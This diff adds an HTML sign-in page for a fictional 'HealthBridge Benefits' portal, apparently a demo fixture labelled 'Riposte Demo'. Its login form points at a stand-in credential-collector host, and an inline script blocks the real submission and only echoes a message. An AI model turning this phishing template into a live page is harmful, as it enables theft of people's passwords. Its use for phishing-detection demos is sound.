@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>HealthBridge Login — Northwind Benefits</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 480px; margin: 2rem auto; padding: 0 1rem; background: #0f172a; color: #e2e8f0; }
+    input { width: 100%; padding: 0.5rem; margin: 0.25rem 0 0.75rem; background: #020617; border: 1px solid #334155; color: #e2e8f0; border-radius: 6px; box-sizing: border-box; }
+    button { background: #059669; color: white; border: none; padding: 0.5rem 1rem; border-radius: 6px; cursor: pointer; }
+    .echo { margin-top: 1rem; font-family: monospace; font-size: 0.85rem; color: #94a3b8; }
+  </style>
+</head>
+<body>
+  <h1>Sign in to Riposte Demo</h1>
+  <p>HealthBridge Benefits — powered by Northwind Corp</p>
+  <form id="login-form" action="https://untrusted-collector.example/submit" method="post">
+    <label for="username">Work email</label>
+    <input type="text" id="username" name="username" placeholder="test-user@riposte.demo">
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" placeholder="••••••••">
+    <button type="submit">Sign in</button>
+  </form>
+  <div id="credential-echo" class="echo"></div>
+  <script>
+    document.getElementById("login-form").onsubmit = function (e) {
+      e.preventDefault();
+      var u = document.getElementById("username").value;
+      var p = document.getElementById("password").value;
+      document.getElementById("credential-echo").textContent =
+        "Submitted to https://untrusted-collector.example/submit — username: " + u + ", password echoed for " + u;
+    };
+  </script>
+</body>
+</html>
